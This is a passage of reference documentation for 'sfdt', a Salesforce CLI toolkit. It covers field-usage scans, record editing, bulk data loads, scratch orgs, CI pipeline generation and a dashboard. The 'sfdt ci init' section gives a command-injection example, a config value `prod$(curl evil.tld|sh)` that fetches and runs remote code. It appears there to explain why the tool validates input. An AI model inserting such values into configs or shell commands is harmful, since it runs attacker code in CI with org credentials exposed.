|---|---|
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--links` | Resolve the org instance URL so rows carry Setup / Flow Builder deep links. Costs one extra `sf` call, so it is opt-in; without it rows carry no URL rather than a broken relative one |
| `--json` | Emit machine-readable output. The scan notes travel in the envelope's `warnings` as well as the body |

`usage` sweeps **every** field on an object instead, which is the shape you want before a
cleanup. It resolves the object's custom fields once, then batches the dependency lookup into
`RefMetadataComponentId IN (…)` queries, so 300 fields cost `ceil(300 / 200)` round trips rather
than 300.

Fields come back in **three** states, and conflating any two of them is the whole failure mode:

| State | Meaning |
|---|---|
| `unreferenced: true` | Nothing referenced it in the sources scanned |
| `unreferenced: false` | Something did — `references` names what |
| `unreferenced: null` | **Not scanned.** A standard field has no `CustomField` record for a dependency edge to point at, and a failed batch leaves its fields here too. This is *unknown*, not clean |

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--population` | Count non-null values for each unreferenced custom field (one query each, five in flight). Required before any field can be called safe to remove |
| `--offline` | Scan the repository instead of an org — no org needed, CI-friendly (see below) |
| `--fail-on-unreferenced` | Exit 1 when any field is unreferenced. Gates on `true` only, never on unknown |
| `--json` | Emit machine-readable output |

#### Why `--population` is not optional in practice

A reference-only sweep will happily report a field holding two million values as unreferenced,
because metadata edges say nothing about data. So `safeToRemove` stays `null` until you have
actually counted, and a field earns it only when **all** of these hold:

- it is custom (a standard field is not yours to remove);
- it was actually scanned, and nothing referenced it;
- its population was actually measured, and is **zero** — a count that *failed* is not a count of
  zero, and is refused;
- it is not required, and not unique (a unique field may back an external key).

Every field that misses the bar carries a `keepReason` saying which condition it failed, so the
list explains itself rather than leaving you to guess why something you expected is absent.

#### `--offline`: the same question, asked of the repo

`--offline` scans your source tree instead of an org. No org alias is resolved at all, so it runs
on a pull request — before the field is deployed anywhere. That is the half a hosted console
structurally cannot offer, because it needs your repository rather than your org.

The field list comes from `objects/<Object>/fields/*.field-meta.xml`, so offline mode covers the
fields tracked in *this repository* — standard fields and anything deployed but not committed are
not included, and the notes say so.

**Structural references do not count as use.** A naive grep reports every field as referenced,
because profiles and permission sets carry a `fieldPermissions` entry for every field they grant,
and layouts list most fields on the object. Those name a field because it *exists*, not because
anything depends on its value. So:

| Kind | Metadata | Counts as use? |
|---|---|---|
| **Logical** | Apex, triggers, flows, validation rules, formulas on other fields, reports, email templates, LWC, Aura, workflows, quick actions | **Yes** |
| **Structural** | Layouts, profiles, permission sets, list views, record types, field sets | No — but still listed, marked `(structural)`, because removing the field means removing those entries too |

Two smaller traps the scan handles: a field's own `.field-meta.xml` names it in `<fullName>` and
is skipped for that field (while still being read for *other* fields' formulas), and matching is
whole-token, so `Region__c` is not counted as used by a file that only mentions `Sub_Region__c`.

Offline results are **always inferred** — a text match is not a reference, and a field name built
at runtime by dynamic SOQL is invisible to any text scan. No field is ever reported as safe to
remove from a repo scan: there is no data to count, and a field unreferenced in source may hold
millions of values in every org it is deployed to.

#### `--fail-on-unreferenced`: the CI gate

Exits 1 when any field comes back unreferenced. It gates on `unreferenced === true` **only** — a
field whose status is unknown never fails a build, because the gate would then be firing on our
inability to check rather than on anything about your repo, and the first thing anyone would do is
delete the gate. When fields were skipped, the failure message says how many.

```yaml
- name: Flag unreferenced fields
  run: npx --yes @sfdt/cli@latest field usage Account --offline --fail-on-unreferenced
```

This is deliberately **not** added to the generated CI templates. The audit gate belongs there
because it is cheap and org-wide; a field sweep is per-object, so a generic template step would
ship everyone a job with no object configured. Add the snippet where it fits your repo.

#### Read the scan scope, not just the rows

Both subcommands print a **Scan scope** section, and it is not decoration. A run that could not
read half the org and a run that read all of it both end in "no writer found"; the notes are the
only thing that tells them apart. They state:

- **Which queries were refused.** A `CustomField` lookup rejected for permissions is reported as
  refused — *not* as "this field has no dependency edge". A failed query is not a finding about
  your org.
- **Which caps bound the scan**, and what fell outside them.
- **Which rule was applied.** A field with a dependency edge is scanned leniently (an unbindable
  write is kept as a lead); a field without one falls back to a broad scan of recently-modified
  active flows and is scanned *strictly* (only a write bound to the object counts). Results from
  the two paths are not directly comparable, and the notes say so.
- **What the Flow parser does not model** — Transform elements, invocable and quick actions, and
  the bodies of called subflows. A flow that writes the field only that way produces no row.

- For `usage`, additionally: that `MetadataComponentDependency` does not record an edge for every
  kind of reference, how many fields were left unknown and why, and whether a batch came back at
  its row cap.

An empty result therefore means *no writer was found by the sources scanned*. It is never proof
that nothing writes the field.

---

### sfdt record

Read, update, or copy a **single** record. The editability model is
[`@sfdt/flow-core`](../packages/flow-core)'s — the same module the Chrome extension's inspector
uses — so a field is refused here for the identical stated reason it is refused in the browser.

```bash
sfdt record get 001800000000001AAA
sfdt record edit 001800000000001AAA --set Name="Acme Corp" --set Phone=555-0100
sfdt record edit 001800000000001AAA --set Name=X --dry-run     # print the body, send nothing
sfdt record clone 006800000000001AAA --set Name="Renewal FY27"
```

**Arguments:**

| Argument | Description |
|---|---|
| `<action>` | `get`, `edit`, or `clone` |
| `<id>` | 15 or 18 character record Id |

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--sobject <name>` | Name the object to skip key-prefix resolution (which costs a global describe) |
| `--set <Field=Value>` | Repeatable. Splits on the **first** `=` only, so a value may contain one; an empty value is an explicit clear |
| `--dry-run` | Print the exact request body without sending it |
| `--json` | Emit machine-readable output |

`get` prints every field — editable ones marked, read-only ones dimmed **with the reason**
(`formula`, `auto-number`, `system`, `unsupported-type`, `no-permission`). Nothing is dropped
from the view, only from the request body.

`edit` refuses a non-editable or unknown field **locally, by name**, before anything reaches the
org, and builds its PATCH from the shared diff — which also omits any field missing from the
record payload, so a field hidden from you by field-level security can never be written to
`null` over a value you were never allowed to see. A value that already matches is a no-op
rather than a write (`100` is not different from `"100"`).

A write reports one of four outcomes and the **exit code follows it**: `saved`, `no-op` and
`dry-run` exit 0; `rejected` exits 1 with the org's message placed on the exact field; and
**`unknown` also exits 1** — a timed-out write may have committed, so the command says the
outcome is unknown rather than claiming nothing was saved, and a script is told to go and look.

Exposed over MCP as `sfdt_record_get` (read-only) plus `sfdt_record_edit` and
`sfdt_record_clone`, both `confirmExecution`-gated.

---

### sfdt data

Manage data sets for sandbox and scratch-org seeding. A data set is a directory under
`config.data.dir` (default `.sfdt/data`) and comes in one of two shapes:

- **Tree** — `queries.json`, a list of SOQL statements. `export` writes a plan plus record
  files via `sf data export tree`, `import` replays them. Preserves relationships; tops out in
  the low thousands of records and cannot upsert.
- **Bulk** — `bulk.json`, a list of CSV load operations run over Bulk API v2 by `load`. Scales,
  and is the only path that can upsert by external id.

A set carries one spec file or the other, never both.

```bash
sfdt data list
sfdt data export accounts --org production
sfdt data import accounts --org scratch1
sfdt data load seed --org scratch1                  # bulk.json, Bulk API v2
sfdt data load seed --org scratch1 --wait 30
sfdt data delete accounts --org scratch1            # prompts for confirmation
sfdt data delete accounts --org scratch1 --yes      # skip the prompt
```

**`bulk.json`:**

```json
{
  "operations": [
    { "sobject": "Account", "file": "accounts.csv", "operation": "insert" },
    {
      "sobject": "Contact",
      "file": "contacts.csv",
      "operation": "upsert",
      "externalId": "External_Id__c",
      "fieldMap": { "Company Name": "Name", "email": "Email" }
    }
  ]
}
```

Operations run in declaration order — a bulk spec's order is usually a dependency order, and
Bulk API v2 jobs are already parallel server-side. `file` must stay inside the data-set
directory.

`fieldMap` exists because `sf data import bulk` has no mapping flag: it matches CSV column
headers to field API names verbatim. A declared map rewrites the header row (only the header,
streamed, so a multi-hundred-MB CSV is never held in memory) into a sibling file under
`.mapped/`, and that copy is what loads. A map key matching no column is reported as
`unmatchedFieldMapKeys` and warned about — otherwise the load would succeed while the field
silently failed to populate.

**Arguments:**

| Argument | Description |
|---|---|
| `<action>` | `list`, `export`, `import`, `load`, or `delete` |
| `[set]` | Data-set name (required for `export`/`import`/`load`/`delete`) |

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--wait <minutes>` | For `load`: minutes to wait for each job. Defaults to `config.data.bulk.waitMinutes` (10) |
| `--async` | For `load`: queue each job and return immediately instead of waiting |
| `--line-ending <LF\|CRLF>` | For `load`: CSV line ending. Defaults to `config.data.bulk.lineEnding`, else sf's own default |
| `-y, --yes` | For `delete` and `load`: skip the confirmation prompt. **Required** for non-interactive runs (`--json`, no TTY, or `SFDT_NON_INTERACTIVE`), which otherwise refuse rather than auto-confirm |
| `--production` | For `load` and `delete`: acknowledge that the target org is production. Detection fails safe — an org whose sandbox status cannot be read is treated as production |
| `--json` | Emit machine-readable output |

> `sfdt data load` inserts or **upserts**, and an upsert overwrites records that are already
> there. It carries two brakes: a production guard (`--production`) and a confirmation that
> refuses rather than auto-confirms when non-interactive. Note `load` is **not** recorded in the
> ledger: `sfdt ledger undo` covers org *configuration* changes, not bulk data writes, so a load
> has to be reversed by loading corrected data.

> `sfdt data delete` bulk-removes every record a data set's queries match — by design for
> scratch/sandbox seed cleanup. It carries the same two brakes as `load`, and the guard is checked
> **before** the prompt, so a refused org is never one you are asked to confirm. Its confirmation
> prints the actual queries and the objects they resolve to rather than a generic warning: for the
> most destructive operation here, the blast radius is the thing worth showing.

`load` reports per-operation results and **exits 1 if any operation failed**, so CI can branch
on the exit code; the JSON envelope carries `errorCount` alongside the raw result. Records
rejected by Salesforce count as a failure even though `sf` itself exits 0 for a job that
processed some rows and rejected others — a half-loaded data set is not a successful seed.

---

### sfdt scratch

Create, delete, list, and pool scratch orgs. A pre-created pool is tracked in `.sfdt/scratch-pool.json`.

```bash
sfdt scratch create --alias feature-x --days 7
sfdt scratch list
sfdt scratch pool status
sfdt scratch pool fill                              # top the pool up to its configured size
sfdt scratch delete feature-x                       # prompts for confirmation
sfdt scratch delete feature-x --yes
```

**Arguments:**

| Argument | Description |
|---|---|
| `<action>` | `create`, `delete`, `list`, or `pool` |
| `[arg]` | For `pool`: `status` or `fill`. For `delete`: the org alias |

**Options:**

| Option | Description |
|---|---|
| `--alias <name>` | Alias for a newly-created scratch org |
| `--days <n>` | Scratch-org duration in days |
| `--size <n>` | Pool size for `pool fill` |
| `-y, --yes` | For `delete`: skip the confirmation prompt (required non-interactively). Deleting an org is irreversible |
| `--json` | Emit machine-readable output |

---

## Commands: CI/CD & Release Automation

---

### sfdt ci init

Generate a ready-to-use CI pipeline. `sfdt ci init` interpolates the cron schedule, org alias, Node version, and delta base into a provider-specific template. For GitHub it writes into `.github/workflows/`; other providers emit a standalone fragment under `.sfdt/ci/`.

> **Interpolated values are validated before anything is written.** The org alias, branch, delta
> base, environment, definition-file path, Node version and cron expression land inside shell
> commands in the generated file, and several of them default from `.sfdt/config.json` — which is
> committed, so it arrives with whatever repository was cloned. Each is restricted to a character
> set appropriate to what it is (an alias, a git ref, a path…), and a value outside it aborts
> generation with a message naming the key and where to fix it. Nothing is written on failure.
>
> This matters because the blast radius is not local: the generated file is committed and pushed,
> then runs in CI **after** the auth step with your org credentials live in the job. A
> `defaultOrg` of `prod$(curl evil.tld|sh)` would otherwise have become
> `--org prod$(curl evil.tld|sh)` in a `run:` line.

```bash
sfdt ci init --provider github --type monitor
sfdt ci init --provider gitlab --type deploy
sfdt ci init --provider azure --type monitor
sfdt ci init --provider bitbucket --type deploy
```

**Options:**

| Option | Description |
|---|---|
| `--provider <name>` | CI provider: `github`, `gitlab`, `azure`, or `bitbucket` |
| `--type <kind>` | Pipeline type: `monitor` (scheduled `monitor all --notify`) or `deploy` (`deploy --smart` on PRs) |

Templates authenticate via the `SFDX_AUTH_URL` secret (referenced by name).

---

### sfdt pr comment

Render the latest org-health snapshot to markdown and post it to the current pull request through a thin `gh` wrapper.

```bash
sfdt pr comment --type audit
sfdt pr comment --type monitor --pr 42
sfdt pr comment --body "Deploy validated cleanly."
sfdt pr comment --file ./report.md
```

**Options:**

| Option | Description |
|---|---|
| `--type <kind>` | Render and post the latest `audit` or `monitor` snapshot |
| `--body <md>` | Post a literal markdown body instead of a snapshot |
| `--file <path>` | Post the contents of a markdown file |
| `--pr <n>` | Target PR number (defaults to the PR for the current branch) |

Requires the GitHub CLI (`gh`) to be installed and authenticated.

---

### sfdt retrofit

Retrieve a configurable metadata set from a source org, commit it, then smart-deploy it to a target org. Reuses the org-inventory + parallel-retrieve engine for the pull and the smart-deploy engine for the push. Validate-only unless `--execute` is passed.

```bash
sfdt retrofit --source production --target staging
sfdt retrofit --source production --target staging --execute
```

**Options:**

| Option | Description |
|---|---|
| `--source <alias>` | Org to retrieve metadata from |
| `--target <alias>` | Org to deploy the retrofit into |
| `--execute` | Perform a real deploy instead of a validate-only run |

---

## Commands: Chrome Extension Bridge

These commands manage the SFDT for Salesforce Chrome extension's connection to the local CLI. The extension talks to sfdt either over HTTP (`sfdt ui` server on port 7654) or via Chrome's native messaging API (managed by these commands). See the top-level README for the full architecture overview.

### sfdt extension

Manage the Chrome native messaging host that backs the extension's fallback transport.

```bash
# Register the native host for one browser (extension ID from chrome://extensions)
sfdt extension install-host --extension-id abcdefghijklmnopabcdefghijklmnop --browser chrome

# Register for every supported Chromium-based browser
sfdt extension install-host --extension-id <id> --browser all

# Inspect which browsers have the host registered
sfdt extension status

# Remove the registration
sfdt extension uninstall-host --browser all

# Show the most recent telemetry snapshot the extension pushed
sfdt extension stats --limit 20
```

**Subcommand options:**

| Subcommand | Options |
|---|---|
| `install-host` | `--extension-id <id>` (required, 32 lowercase a–p chars), `--browser <chrome\|edge\|brave\|chromium\|vivaldi\|all>`, `--json` |
| `uninstall-host` | `--browser <name>`, `--json` |
| `status` | `--json` |
| `stats` | `--limit <n>` (default 10), `--json` |

### sfdt doctor

End-to-end local diagnostic. The **environment** group checks that `sf`, `node`,
and `git` are present, that `.sfdt/` config is valid, that the configured AI
provider is reachable (when enabled), and that the default org is reachable
(always run, but warn-only — it never fails the command and is bounded by a
timeout). The **extension** group checks the bridge, native host, kill-switch
file, and telemetry snapshot. With no flag both groups run.

```bash
sfdt doctor                 # environment + extension groups
sfdt doctor --core          # environment checks only
sfdt doctor --extension     # extension checks only
sfdt doctor --org myAlias   # check a specific org's connectivity
sfdt doctor --json          # CI-friendly structured output
sfdt doctor --port 8080     # bridge runs on a non-default port
```

Exits non-zero if any check fails (org connectivity never fails) — wire this into CI to detect a broken install early.

### sfdt feature-flags

Manage `.sfdt/feature-flags.json` to remotely disable specific extension features. Useful as a kill switch when a feature misbehaves in production.

```bash
sfdt feature-flags list                       # show the current kill-switch file
sfdt feature-flags disable flow-health-check  # add a feature to the kill list
sfdt feature-flags enable flow-health-check   # remove it
sfdt feature-flags clear --remove             # delete the entire kill-switch file
```

The extension polls the bridge ping endpoint and stops loading any feature whose id appears in this file.

---

## Web Dashboard

The dashboard's main pages:

| Page | What it shows | Data source |
|---|---|---|
| **Dashboard** | Summary stat cards: last test run (pass/fail/coverage), preflight status, drift status | `logs/preflight-latest.json`, `logs/drift-latest.json`, `logs/test-results/` |
| **Test Runs** | Apex test history with coverage colouring; run tests from the UI | `logs/test-results/*.json` |
| **Preflight** | Per-check pass/warn/fail list; run preflight from the UI | `logs/preflight-latest.json` |
| **Drift Detection** | Filterable component table (All / Clean / Drift); run drift check from the UI | `logs/drift-latest.json` |
| **Compare** | Org comparison results: source-only, target-only, and shared components; XML diff of individual components; export source-only items as `package.xml` | `logs/compare-latest.json` |
| **Review** | AI-powered code review results for the current branch | `logs/review-latest.json` |
| **Explain** | AI-powered deployment log analysis | `logs/explain-latest.json` |
| **Release Hub** | Release manifest artifacts and release notes | `logs/release/` |
| **Manifest Builder** | Changeset-style builder: browse metadata by type (org inventory or local source), tick components (or a whole type → `*` wildcard), watch a live server-rendered XML preview, and save `rl-<name>-package.xml` — or, in destructive mode, the `rl-<name>-destructiveChanges.xml` + empty `package.xml` pair (deploy timing: `SFDT_DESTRUCTIVE_TIMING`, see `docs/ENV-VARS.md`). Selections persist per org. | `/api/manifest/discover-org` (cached by `logs/scan-latest.json`), `/api/manifest/discover`, `/api/manifest/render`, `/api/manifest/save` |
| **SOQL Console** | The `sfdt soql` family as a page: search sObjects and browse fields/relationships, validate a query (local checks + org `LIMIT 0` round-trip), fetch query plans (never executed), and run SOQL/SOSL with the configured row bound (`soql.defaultLimit` clamped to `soql.maxLimit`, bound/truncated metadata shown). Results export as raw JSON or the runner-shaped CSV — same engine as the CLI (`soql-runner.js`), no logic reimplemented. Deep-linkable at `/soql`. | `/api/soql/sobjects`, `/api/soql/describe`, `/api/soql/relationships`, `/api/soql/validate`, `/api/soql/plan`, `/api/soql/query`, `/api/soql/sosl` |

**Live command runner:** The Test Runs, Preflight, and Drift pages each have a "Run" button that triggers the corresponding shell script via a Server-Sent Events stream. Output appears line-by-line in the UI in real time, the same as running the CLI command directly.

**AI Chat drawer:** The toolbar includes an "Ask AI" button that opens a sliding chat panel. Pages with relevant output (Review, Explain, Drift, Preflight) pre-fill the chat with that context so you can ask follow-up questions without copy-pasting.

**Compare page workflow:**
1. Select a source (local or an org alias) and a target org.
2. Click "Compare" — the page calls `POST /api/compare` and shows the diff inventory.
3. Filter by status (`source-only`, `target-only`, `both`).
4. Click any component in the "both" list to view a side-by-side XML diff.
5. Select source-only components and export them as `package.xml`.

---

## Drift vs Compare: choosing the right tool

These two commands are often confused. Here is when to use each:

| Question | Tool |
|---|---|
| "Has anyone changed metadata in the org directly without committing it?" | `sfdt drift` |
| "What metadata exists in one org but not the other?" | `sfdt compare` |
| "I want to know if my local source is the authoritative version of what's deployed" | `sfdt drift` |
| "I want to know what needs to be deployed to bring a sandbox up to par with production" | `sfdt compare` |
| "I want to generate a deployment manifest of what's missing from the target" | `sfdt compare --output missing.xml` |

**`sfdt drift`** runs `scripts/new/drift.sh` which performs a deep per-component diff between the local source files and the org's deployed state. It tells you which components have content differences.

**`sfdt compare`** uses `org-inventory.js` to enumerate all metadata *members* in both sides and produces a set difference: which members exist only in source, only in target, or in both. It does not compare file content — it compares presence. Use the Compare dashboard page's XML diff feature for content comparison of specific components.

---

## Common workflows

### Deploy a feature branch to sandbox

```bash
git checkout feature/my-feature
sfdt changelog check          # verify changelog is up to date
sfdt preflight                 # validate branch
sfdt test                      # run Apex tests
sfdt manifest                  # generate package.xml from git diff vs main
sfdt deploy                    # deploy (runs preflight again internally)
sfdt smoke                     # post-deploy smoke tests
```

### Prepare a production release

```bash
git checkout main
git merge --no-ff feature/my-feature
sfdt changelog generate        # AI-generate CHANGELOG entries from git log
sfdt changelog release 1.5.0   # move [Unreleased] → [1.5.0]
sfdt release 1.5.0             # generate manifests, release notes, commit, tag, optional deploy, push
sfdt notify release-created --version 1.5.0
```

### Investigate a failed deployment

```bash
sfdt explain                   # analyze the most recent log file
# or pipe directly:
sf project deploy start ... 2>&1 | sfdt explain --from-stdin
```

### Audit what's in production that isn't in source

```bash
sfdt compare --source local --target production
# Open sfdt ui and go to Compare → filter by "target-only"
```

### Promote sandbox changes to production

```bash
sfdt compare --source staging --target production --output deploy/promote.xml
sf project deploy start --manifest deploy/promote.xml --target-org production
```

### Generate a PR description before opening a PR

```bash
sfdt pr-description --output pr-body.md
# paste pr-body.md content into the GitHub PR description
# or write directly to gh:
sfdt pr-description | gh pr create --title "feat: ..." --body-file /dev/stdin
```

### Review code before merging

```bash
sfdt review --base main
# or from the PR:
sfdt review --base origin/main
```

---

## CI/CD integration

sfdt commands are non-interactive when stdin is not a TTY — confirmations are skipped and the command exits with an appropriate exit code.

### GitHub Actions example

```yaml
- name: Preflight and deploy
  run: |
    sfdt preflight
    sfdt test
    sfdt deploy --skip-preflight
  env:
    SFDX_AUTH_URL: ${{ secrets.SFDX_AUTH_URL }}
```

### Using the AI commands in CI

For Gemini or OpenAI in CI, install and authenticate the matching CLI before running sfdt:

```yaml
- name: Explain failure
  if: failure()
  run: sfdt explain --latest
```

Claude is not suitable for CI use (it requires an interactive session). Use Gemini or OpenAI for CI-based AI commands.

### Exit codes

All sfdt commands exit `0` on success and `1` on failure. Use standard shell `set -e` or check `$?` to gate subsequent steps.
